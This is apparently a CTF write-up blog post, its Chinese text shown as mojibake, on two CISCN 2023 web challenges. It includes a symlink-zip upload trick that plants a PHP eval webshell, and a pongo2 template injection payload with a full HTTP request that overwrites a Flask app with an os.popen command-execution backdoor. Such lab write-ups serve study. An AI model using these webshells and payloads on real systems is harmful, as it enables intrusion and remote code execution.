---
title: ciscn2023 webéƒ¨åˆ†
date: 2024-11-25 20:28:13
permalink: /pages/0e353f/
categories:
  - wp
tags:
  - wp
  - ctf
author: 
  name: the0n3
  link: https://the0n3.top
---
å­¦ä¹ ä¸‹ciscn2023 webéƒ¨åˆ†

<!-- more -->

## unzip

å¤ç°åœ°å€[ctfshow ciscn2023 unzip](https://ctf.show/challenges#Unzip-4002)

å°è¯•ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡ï¼Œä¸Šä¼ æ¥å£è¿”å›å¤„ç†çš„æºç 

![1](/medias/ciscn2023/1.png)

```php
<?php
# è·å–æ–‡ä»¶MIMEç±»å‹
$finfo = finfo_open(FILEINFO_MIME_TYPE);
# éªŒè¯MEMEç±»å‹ï¼Œåˆ¤æ–­æ–‡ä»¶ç±»å‹æ˜¯å¦ä¸ºzip
if (finfo_file($finfo, $_FILES["file"]["tmp_name"]) === 'application/zip'){
# ç§»åŠ¨åˆ°tmpç›®å½•ï¼Œè§£å‹åœ¨ä¸´æ—¶ç›®å½•é‡Œä¸Šä¼ çš„zipæ–‡ä»¶
    exec('cd /tmp && unzip -o ' . $_FILES["file"]["tmp_name"]);
};
```

åˆ†æä¸€ä¸‹ï¼š

- ä¸Šä¼ zipæ–‡ä»¶ï¼Œè§£å‹åˆ°`/tmp`ç›®å½•
- `unzip -o`å‚æ•°ï¼Œå¦‚æœzipæ–‡ä»¶ä¸­å­˜åœ¨åŒåæ–‡ä»¶ï¼Œåˆ™è¦†ç›–

é€šè¿‡ä¸Šé¢ä¸¤æ­¥æ“ä½œï¼Œå¯ä»¥å’Œlinux`è½¯é“¾æ¥`ç»“åˆèµ·æ¥å®ç°ä»¥ä¸‹åŠŸèƒ½ï¼š

- åˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥æ–‡ä»¶`link`ï¼ŒæŒ‡å‘ç½‘ç«™æ ¹ç›®å½•`/var/www/html`ï¼Œå‹ç¼©ä¸Šä¼ 
- åˆ›å»ºåŒåæ–‡ä»¶å¤¹`link`ï¼Œåœ¨æ–‡ä»¶å¤¹é‡Œåˆ›å»ºæœ¨é©¬æ–‡ä»¶ï¼Œåœ¨ä½¿åœ¨è§£å‹åèƒ½å¤Ÿè¦†ç›–`link`æ–‡ä»¶å³`/var/www/html`ç›®å½•ï¼Œå¯ä»¥å®ç°æŠŠæœ¨é©¬è§£å‹åˆ°`/var/www/html`ç›®å½•getshell

åœ¨ç¬¬ä¸€æ­¥åˆ›å»º`link`è½¯è¿æ¥æ–‡ä»¶å‹ç¼©åï¼Œ**è®°å¾—åˆ é™¤ï¼Œå¦åˆ™æ— æ³•åˆ›å»ºåŒåæ–‡ä»¶å¤¹`link`**ï¼Œæ˜¯å¦ä¸€å®šè¦åŒåæ–‡ä»¶å¤¹ï¼Ÿæ˜¯ï¼Œå¦åˆ™å‰é¢åˆ›å»ºçš„è½¯è¿æ¥æ²¡æœ‰æ„ä¹‰

æ¼”ç¤ºï¼š

åœ¨æœ¬åœ°åˆ›å»º`link`è½¯è¿æ¥æ–‡ä»¶ï¼ŒæŒ‡å‘`/var/www/html`ç›®å½•

```bash
# åˆ›å»ºè½¯è¿æ¥
ln -s /var/www/html link
# å‹ç¼©
zip --symlinks link.zip link
```

![2](/medias/ciscn2023/2.png)

åˆ é™¤`link`è½¯è¿æ¥æ–‡ä»¶ï¼Œåˆ›å»ºåŒåæ–‡ä»¶å¤¹`link`ï¼Œåœ¨æ–‡ä»¶å¤¹é‡Œåˆ›å»º`shell.php`æ–‡ä»¶

```bash
# åˆ é™¤è½¯è¿æ¥
rm link
# åˆ›å»ºæ–‡ä»¶å¤¹ï¼Œè¿›å…¥
mkdir link
cd link
# å†™ä¸ªğŸå­
echo '<?php highlight_file(__FILE__);eval($_GET[1]);phpinfo();?>' > shell.php
# ç§»åŠ¨åˆ°ä¸Šä¸€çº§ï¼Œå‹ç¼©
zip -r link1.zip ./link/*
```

![3](/medias/ciscn2023/3.png)

ç°åœ¨ï¼Œå¯ä»¥å…ˆä¸Šä¼ `link.zip`æ–‡ä»¶ï¼Œå®ç°è§£å‹åçš„`link`é“¾æ¥åˆ°`/var/www/html`ç›®å½•ï¼Œå†ä¸Šä¼ `link1.zip`æ–‡ä»¶ï¼ŒæŠŠå†™å¥½çš„æœ¨é©¬ç›´æ¥è§£å‹åˆ°`/var/www/html`ç›®å½•getshellï¼Œå¦‚æœæœ¨é©¬æ–‡ä»¶åä¸º`upload.php`,`index.php`åº”è¯¥è¿˜å¯ä»¥è¦†ç›–åŸæ–‡ä»¶

è®¿é—®æœ¨é©¬è·¯å¾„

![4](/medias/ciscn2023/4.png)


## go_session

è€ƒç‚¹ï¼š

> sessionä¼ªé€ ï¼Œpongo2æ¨¡æ¿æ³¨å…¥ï¼Œdebugæ¨¡å¼è¦†ç›–æºæ–‡ä»¶ï¼Œé€šè¿‡goçš„æ¨¡æ¿æ¸²æŸ“ä¿®æ”¹debugæ¨¡å¼ä¸‹çš„flaskï¼Œæ‰“ä¸€ä¸ªssrf

è¿™é“é¢˜æ˜¯go,pythonçš„æ¨¡æ¿æ¸²æŸ“å¼•æ“è”åŠ¨ï¼Œæœ‰go webæœåŠ¡å’Œpython webæœåŠ¡

- [pongo2æ¨¡æ¿å¼•æ“](https://go-macaron.com/zh-cn/middlewares/templating)

main.goä½¿ç”¨goæ­å»ºçš„webæœåŠ¡ï¼Œå®šä¹‰äº†ä¸‰ä¸ªè·¯ç”±ï¼Œ`/`ã€`/admin`ã€`/flask`ï¼Œå¯ä»¥çŒœæµ‹`/flask`è·¯ç”±ä¸‹æ˜¯python webæœåŠ¡

- `github.com/gin-gonic/gin`ï¼šå¯¼å…¥ Gin æ¡†æ¶åŒ…ï¼Œæä¾›äº† web è·¯ç”±å’Œ HTTP è¯·æ±‚å¤„ç†åŠŸèƒ½

- `main/route`ï¼šå¯¼å…¥é¡¹ç›®ä¸­çš„ `route` åŒ…ï¼Œè¿™ä¸ªåŒ…åº”è¯¥åŒ…å«äº†ä¸è·¯ç”±ç›¸å…³çš„å¤„ç†å‡½æ•°

```go
package main

import (
        "github.com/gin-gonic/gin"
        "main/route"
)

func main() {
        r := gin.Default()
        r.GET("/", route.Index)
        r.GET("/admin", route.Admin)
        r.GET("/flask", route.Flask)
        r.Run("0.0.0.0:80")
}
```

`route/route.go`æºç 

è¿™æ˜¯ä¸€ä¸ªè·¯ç”±æ–‡ä»¶ï¼Œä½¿ç”¨äº†Ginæ¡†æ¶å’Œpongo2çš„æ¨¡æ¿å¼•æ“ï¼Œå®šä¹‰äº†ä¸‰ä¸ªè·¯ç”±å¤„ç†å‡½æ•°ï¼š`Index`ã€`Admin`å’Œ`Flask`

```go
package route

import (
        "github.com/flosch/pongo2/v6"
        "github.com/gin-gonic/gin"
        "github.com/gorilla/sessions"
        "html"
        "io"
        "net/http"
        "os"
)

var store = sessions.NewCookieStore([]byte(os.Getenv("SESSION_KEY")))

func Index(c *gin.Context) {
        session, err := store.Get(c.Request, "session-name")
        if err != nil {
                http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
                return
        }
        if session.Values["name"] == nil {
                session.Values["name"] = "guest"
                err = session.Save(c.Request, c.Writer)
                if err != nil {
                        http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
                        return
                }
        }

        c.String(200, "Hello, guest")
}

func Admin(c *gin.Context) {
        session, err := store.Get(c.Request, "session-name")
        if err != nil {
                http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
                return
        }
        if session.Values["name"] != "admin" {
                http.Error(c.Writer, "N0", http.StatusInternalServerError)
                return
        }
        name := c.DefaultQuery("name", "ssti")
        xssWaf := html.EscapeString(name)
        tpl, err := pongo2.FromString("Hello " + xssWaf + "!")
        if err != nil {
                panic(err)
        }
        out, err := tpl.Execute(pongo2.Context{"c": c})
        if err != nil {
                http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
                return
        }
        c.String(200, out)
}

func Flask(c *gin.Context) {
        session, err := store.Get(c.Request, "session-name")
        if err != nil {
                http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
                return
        }
        if session.Values["name"] == nil {
                if err != nil {
                        http.Error(c.Writer, "N0", http.StatusInternalServerError)
                        return
                }
        }
        resp, err := http.Get("http://127.0.0.1:5000/" + c.DefaultQuery("name", "guest"))
        if err != nil {
                return
        }
        defer resp.Body.Close()
        body, _ := io.ReadAll(resp.Body)

        c.String(200, string(body))
}
```

ç®€å•åˆ†æï¼š

- Indexï¼šè·å–sessionï¼Œå¦‚æœsessionä¸­nameä¸ºç©ºï¼Œåˆ™è®¾ç½®nameä¸ºguestï¼Œè¿”å›å­—ç¬¦ä¸²"Hello, guest"
- Adminï¼šè·å–sessionï¼Œå¦‚æœsessionä¸­nameä¸ä¸ºadminï¼Œåˆ™è¿”å›"NO"ï¼Œå¦åˆ™è·å–nameå‚æ•°ï¼Œç»è¿‡htmlè½¬ä¹‰åï¼Œä½¿ç”¨pongo2æ¨¡æ¿å¼•æ“æ¸²æŸ“å­—ç¬¦ä¸²"Hello " + xssWaf + "!"ï¼Œè¿”å›æ¸²æŸ“åçš„å­—ç¬¦ä¸²
- Flaskï¼šè·å–sessionï¼Œå¦‚æœsessionä¸­nameä¸ºç©ºï¼Œåˆ™è¿”å›"NO"ï¼Œå¦åˆ™å‘http://127.0.0.1:5000/å‘é€GETè¯·æ±‚ï¼Œè·å–å“åº”ä½“ï¼Œè¿”å›å“åº”ä½“

å…¶ä¸­åœ¨`Index`å‡½æ•°å‚æ•°ä¼ çš„æ˜¯`gin.Context`ï¼Œç±»ä¼¼flaskçš„`flask.Request` æˆ– `flask.g`ï¼ŒåŒ…å«äº†å½“å‰httpè¯·æ±‚å’Œå“åº”çš„ä¿¡æ¯ã€æ“ä½œæ–¹æ³•å’Œå±æ€§çš„ç»“æ„ä½“ï¼Œç”¨äºåœ¨å¤„ç†httpè¯·æ±‚æ—¶ä¼ é€’å’Œæ“ä½œè¿™äº›ä¿¡æ¯ã€‚åŒæ—¶gin.Contextè¿˜æä¾›äº†ä¸€ç³»åˆ—çš„æ–¹æ³•ç”¨äºå¤„ç†è¿™äº›ä¿¡æ¯ï¼Œè¿™ä¸ªå°†æ˜¯æˆ‘ä»¬åé¢åˆ©ç”¨çš„é‡ç‚¹

```go
func Index(c *gin.Context) {
        session, err := store.Get(c.Request, "session-name")
        if err != nil {
                http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
                return
        }
        if session.Values["name"] == nil {
                session.Values["name"] = "guest"
                err = session.Save(c.Request, c.Writer)
                if err != nil {
                        http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
                        return
                }
        }
        c.String(200, "Hello, guest")
}
```

åœ¨Adminå‡½æ•°é‡Œï¼Œè·å–sessionä¸­nameçš„å€¼æ˜¯å¦ä¸º`admin`ï¼Œå¦‚æœä¸æ˜¯ï¼Œç¨‹åºåœæ­¢ã€‚å¦‚æœ`name`çš„å€¼æ˜¯`admin`ï¼Œä½¿ç”¨`name := c.DefaultQuery("name", "ssti")`è·å–æŸ¥è¯¢å‚æ•°`name`çš„å€¼ï¼Œå¦‚æœ`name`ä¸å­˜åœ¨ï¼Œåˆ™é»˜è®¤ä¸º`ssti`ã€‚ç„¶åä½¿ç”¨`html.EscapeString(name)`å¯¹`name`è¿›è¡Œhtmlè½¬ä¹‰ï¼Œé˜²æ­¢xssæ”»å‡»ã€‚æ¥ç€ä½¿ç”¨`pongo2`æ¨¡æ¿å¼•æ“æ¸²æŸ“å­—ç¬¦ä¸²`Hello " + xssWaf + "!"`

```go
func Admin(c *gin.Context) {
        session, err := store.Get(c.Request, "session-name")
        if err != nil {
                http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
                return
        }
        if session.Values["name"] != "admin" {
                http.Error(c.Writer, "N0", http.StatusInternalServerError)
                return
        }
        name := c.DefaultQuery("name", "ssti")
        xssWaf := html.EscapeString(name)
        tpl, err := pongo2.FromString("Hello " + xssWaf + "!")
        if err != nil {
                panic(err)
        }
        out, err := tpl.Execute(pongo2.Context{"c": c})
        if err != nil {
                http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
                return
        }
        c.String(200, out)
}
```

åœ¨`Flask`å‡½æ•°é‡Œï¼Œå…³é”®åœ¨æ¥æ”¶ä¸€ä¸ªnameå‚æ•°ï¼Œå‘ç»™æœ¬åœ°çš„5000ç«¯å£å¤„ç†ï¼Œè¿”å›ç»“æœã€‚éœ€è¦è¿™æ ·ä¼ å‚`url?name=?name=123`ï¼Œé”®å`?name=`ç›´æ¥ä¼ ç»™go webï¼Œé”®å€¼`?name=123`ä¼ ç»™flask

```go
resp, err := http.Get("http://127.0.0.1:5000/" + c.DefaultQuery("name", "guest"))
```

å…ˆå°è¯•ä¼ªé€ sessionï¼Œsessionçš„å¯†é’¥åœ¨`route/route.go`æºç é‡Œæåˆ°äº†`session_key`çš„è·å–æ–¹å¼ï¼Œä»ç³»ç»Ÿå˜é‡é‡Œè·å–ï¼Œæ²¡åŠæ³•è·å–ï¼Œå¤§èƒ†çŒœæµ‹ç¯å¢ƒå˜é‡`session_key`ä¸ºç©ºï¼Œæœ¬åœ°æ­ä¸€ä¸ªç¯å¢ƒçœ‹çœ‹`admin`çš„sessionå€¼

```go
var store = sessions.NewCookieStore([]byte(os.Getenv("SESSION_KEY")))
```

æœ¬åœ°ä¿®æ”¹`route/route.go`çš„routeå‡½æ•°æºç ï¼ŒæŠŠç»™æ‰€æœ‰ç”¨æˆ·è®¾ä¸º`admin`çš„sessionï¼Œæ–¹ä¾¿æ‹¿åˆ°

![5](/medias/ciscn2023/5.png)

ä½¿ç”¨goå®˜æ–¹çš„ä»£ç†ï¼ŒåŠ é€Ÿä¾èµ–ä¸‹è½½åŠgithubç›¸å…³ä¾èµ–çš„è®¿é—®ï¼Œè¿è¡Œmain.go

```bash
sudo go env -w GOPROXY=https://goproxy.io,direct
sudo go run main.go
```

![6](/medias/ciscn2023/6.png)

è®¿é—®80ç«¯å£æ‹¿åˆ°`admin`çš„sessionï¼ŒæŠŠä¼ªé€ çš„sessionæ›¿æ¢åˆ°é¢˜ç›®é‡Œï¼Œåˆ°adminè·¯ç”±ï¼Œå‘ç°æ¸²æŸ“äº†`hello ssti`ï¼Œè¯´æ˜ä¼ªé€ æˆåŠŸäº†

è®¿é—®`flask`è·¯ç”±ä¼ å…¥nameå‚æ•°ï¼Œè¿”å›äº†flaskçš„debugçš„æ–‡æœ¬ä¿¡æ¯ï¼Œå¤ªä¸‘äº†ï¼Œå¯ä»¥æ‰¾åˆ°flaskåº”ç”¨çš„è·¯å¾„`/app/server.py`

![7](/medias/ciscn2023/7.png)

flaskæ˜¯å¼€å¯debugæ¨¡å¼çš„ï¼Œ`server.py`æºç ä¿®æ”¹æ—¶ä¼šè‡ªåŠ¨é‡å¯

åœ¨goçš„`gin`æ¨¡æ¿å¼•æ“é‡Œï¼Œ`SaveUploadedFile()`å‡½æ•°æ¥å£å¯ä»¥å®ç°æ–‡ä»¶ä¸Šä¼ 

```go
func (c *Context) SaveUploadedFile(file *multipart.FileHeader, dst string) error
```

ç¬¬ä¸€ä¸ªå‚æ•°è·å–è¡¨å•ä¸Šä¼ çš„æ–‡ä»¶ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¿å­˜çš„è·¯å¾„
 
æ„é€ payloadï¼š

::: v-pre
```go
{{c.SaveUploadedFile(c.FormFile("file"),"/app/server.py")}}
```
:::

åœ¨Indexå‡½æ•°é‡Œï¼Œä½¿ç”¨äº†`html.EscapeString()`å‡½æ•°å¯¹`name`è¿›è¡Œhtmlè½¬ä¹‰ï¼Œä¼šå½±å“è¿™ä¸ªpayloadé‡Œçš„å¼•å·

æƒ³åŠæ³•ç”¨å…¶ä»–æ–¹æ³•æ›¿æ¢

- ç¬¬ä¸€ä¸ªå‚æ•°ï¼š`c.FormFile("file")`å°±æ˜¯å‰ç«¯å†™çš„ä¸Šä¼ çš„nameçš„å€¼ï¼Œåœ¨è¿™é‡Œå°±æ˜¯fileï¼Œåªè¦èƒ½ç”¨`gin`æ¨¡æ¿å¼•æ“è·å–ä¸€ä¸ªå­—ç¬¦ä¸²æ”¾åœ¨è¿™é‡Œå ä½ä¸åé¢æ–‡ä»¶ä¸Šä¼ æ—¶çš„nameä¿æŒä¸€è‡´å³å¯
- ç¬¬äºŒä¸ªå‚æ•°ï¼š`/app/server.py`ï¼Œå¸ˆå‚…ä»¬ä½¿ç”¨çš„æ˜¯`c.Request.Referer()`ä»httpå¤´é‡Œè·å–çš„refererã€‚æˆ‘åœ¨æƒ³ä¸ºä»€ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°ä¸è¿™ä¹ˆåšå‘¢ï¼Ÿ

ç¬¬ä¸€ä¸ªå‚æ•°çš„è§£å†³åŠæ³•ï¼š

- `Context.HandlerName()`ï¼š

```go
HandlerName
è¿”å›ä¸»å¤„ç†ç¨‹åºçš„å¤„ç†å™¨å‡½æ•°åç§°ã€‚ä¾‹å¦‚ï¼Œå¦‚æœå¤„ç†ç¨‹åºæ˜¯â€œhandleGetUsers()â€ï¼Œæ­¤å‡½æ•°å°†è¿”å›â€œmain.handleGetUsersâ€
```

åœ¨`main.go`é‡Œï¼Œæ‰€ä»¥å¦‚æœæ˜¯åœ¨Admin()å‡½æ•°é‡Œè°ƒç”¨ï¼Œè¿”å›çš„å°±æ˜¯main/route.Adminï¼Œåœ¨Index()é‡Œï¼Œè¿”å›çš„å°±æ˜¯main/route.Index

è¿™é‡Œæ‰§è¡Œgo sstiæ¨¡å—åœ¨main.goçš„Adminé‡Œï¼Œ`Context.HandlerName()`å¯ä»¥è·å–åˆ°`main/route.Admin`ï¼Œé…åˆ`last`è¿‡æ»¤å™¨è·å–æœ€åä¸€ä¸ªå­—ç¬¦ä¸²`n`ä½œä¸ºæ–‡ä»¶å


ç¬¬äºŒä¸ªå‚æ•°ï¼š

ç›´æ¥æ‹¿`Context`çš„httpè¯·æ±‚å¤´é‡Œçš„å†…å®¹ï¼Œ`c.Request.Referer()`ï¼Œè·å–referer`/app/server.py`

payloadï¼š

::: v-pre
```go
{{c.SaveUploadedFile(c.FormFile(c.HandlerName()|last),c.Request.Referer())}}
```
:::

æœ‰äº†payloadï¼Œç”¨bpä¸Šä¼ ä¸€ä¸ªserver.pyæ–‡ä»¶ï¼Œè¦†ç›–åŸæœ‰çš„server.pyæ–‡ä»¶ï¼Œæ‰§è¡Œå‘½ä»¤

æ‹¿ä¸€ä¸ªå¸ˆå‚…çš„pocï¼Œå¤åˆ¶åˆ°bpçš„`Repeate`æ¨¡å—æŠŠhostï¼Œsessionæ›¿æ¢æ‰ï¼Œ`server.py`å¯ä»¥è‡ªå·±ä¿®æ”¹

::: v-pre
```plaintext
GET /admin?name={{c.SaveUploadedFile(c.FormFile(c.HandlerName()|last),c.Request.Referer())}} HTTP/1.1
Host: 35e1a5bc-b6c3-4cbb-a4cd-10a1442dd09d.challenge.ctf.show
Referer: /app/server.py
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8ALIn5Z2C3VlBqND
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie:session-name=MTczMjYxNzExMHxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXzHBTGHoCnNu3cFSjoBf3yDewNXiCPuYMFdWsXNLwgXAA==
Upgrade-Insecure-Requests: 1
Content-Length: 425

------WebKitFormBoundary8ALIn5Z2C3VlBqND
Content-Disposition: form-data; name="n"; filename="1.py"
Content-Type: text/plain

from flask import *
import os
app = Flask(__name__)

@app.route('/')
def index():
    name = request.args['name']
    file=os.popen(name).read()
    return file

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
------WebKitFormBoundary8ALIn5Z2C3VlBqND--
```
:::

ä¸Šä¼ æˆåŠŸ

![11](/medias/ciscn2023/11.png)

è®¿é—®flaskè·¯ç”±æ‰§è¡Œå‘½ä»¤

![12](/medias/ciscn2023/12.png)

::: v-pre
å…¶ä»–å°è¯•ï¼šåœ¨payload`{{c.SaveUploadedFile(c.FormFile(c.HandlerName()|last),c.Request.Referer())}}`é‡Œï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ç†è§£ä¸ºä»€ä¹ˆè¿™æ ·æ‹¿ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä¸æ˜¯ç›´æ¥åœ¨httpå‚æ•°äº†æ‹¿
:::

å¥½å§ï¼Œæ‹·æ‰“äº†ä¸€ä¸‹gptï¼Œå¥½åƒå—çœŸçš„æœ‰é™ï¼Ÿçœ‹èµ·æ¥åªæœ‰`c.ClientIP(),c.Request.Host,c.Request.Referer(),c.Request.RemoteAddr`è¿™å‡ ä¸ªæœ‰åˆ©ç”¨çš„å¯èƒ½ã€‚æŸ¥é˜…ä¸€ä¸‹ï¼Œ`c.Request.RemoteAddr`è·å–çš„æ˜¯tcpåè®®çš„ç½‘ç»œåº•å±‚ipï¼Œè²Œä¼¼æ§åˆ¶ä¸äº†ï¼Œ`c.ClientIP()`è·å–çš„X-Forwarded-Forå¤´ï¼Œå¯ä»¥å°è¯•ä¼ªé€ ä¸€ä¸‹ï¼Œ`c.Request.Host`è·å–çš„æ˜¯httpå¤´é‡Œçš„hostï¼Œbpä¼ªé€ äº†å¥½åƒå°±ä¸èƒ½å‘åŒ…äº†ï¼Œ`c.Request.Referer()`è·å–çš„æ˜¯httpå¤´é‡Œçš„refererï¼Œå¯ä»¥ä¼ªé€ 

```go
c.GetHeader("User-Agent")
c.GetHeader("Content-Type")
c.FullPath()
c.DefaultQuery("name", "guest")
c.Param("userID")
c.Request.Method
c.Cookie("session_id")
c.ClientIP()
c.Request.Proto
c.GetHeader("User-Agent")
c.Request.Referer()
c.Request.Host
c.Request.RemoteAddr
```

é™Œç”Ÿï¼Œçœ‹ä¸æ‡‚ã€‚ç†Ÿæ‚‰ï¼Œå¤±è´¥äº†

```plaintext
[Error (where: execution) in <string> | Line 1 Col 9 near 'c'] [Error (where: execution) in <string> | Line 1 Col 28 near 'c'] http: no such file
```

![13](/medias/ciscn2023/13.png)


å‚è€ƒã€è‡´è°¢ï¼š

- [ã€CISCN2023ã€‘unzip è¯¦è§£](https://www.cnblogs.com/gxngxngxn/p/17439035.html)
- [ä¸€ä¸ªæœ‰è¶£çš„ä»»æ„æ–‡ä»¶è¯»å–](https://xz.aliyun.com/t/2589?time__1311=n4%2Bxni0%3DG%3Di%3D0QAeGNDQTcqYqeGTZxY5vd4x)
- [ctfshow](https://ctf.show)
- [[CISCN 2023 åˆèµ›]go_session](https://blog.csdn.net/m0_73512445/article/details/134261219)
- [CISCN2023åˆèµ›-webå¤ç°](https://www.cnblogs.com/EddieMurphy-blogs/p/18155714)